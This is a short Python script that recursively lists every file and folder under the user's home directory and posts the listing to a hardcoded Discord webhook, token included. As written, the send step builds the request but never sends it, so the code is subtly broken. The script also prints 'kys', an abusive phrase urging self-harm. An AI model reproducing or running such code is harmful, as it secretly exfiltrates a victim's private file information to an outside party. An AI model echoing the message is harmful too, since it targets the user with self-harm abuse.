import os
import json
import urllib.request

def get_directory_structure(path, indent=0):
    structure = '  ' * indent + os.path.basename(path) + '/\n'
    if os.path.isdir(path):
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            structure += get_directory_structure(item_path, indent + 1)
    return structure

def send_structure_to_discord(webhook_url, content):
    data = {"content": content}
    json_data = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(webhook_url, data=json_data, headers={'Content-Type': 'application/json'})

print("kys")


try:
    home_dir = os.path.expanduser("~")
    directory_structure = get_directory_structure(home_dir)

    webhook_url = "https://discord.com/api/webhooks/1314158911267536936/k3Q9W4xp5L1kLTOwGMXAzlwQepVScbrt60hamaK50ivfswiRgHhieJreY1pNWCRJ-hew"
    send_structure_to_discord(webhook_url, directory_structure)
except Exception as e:
    print(e)
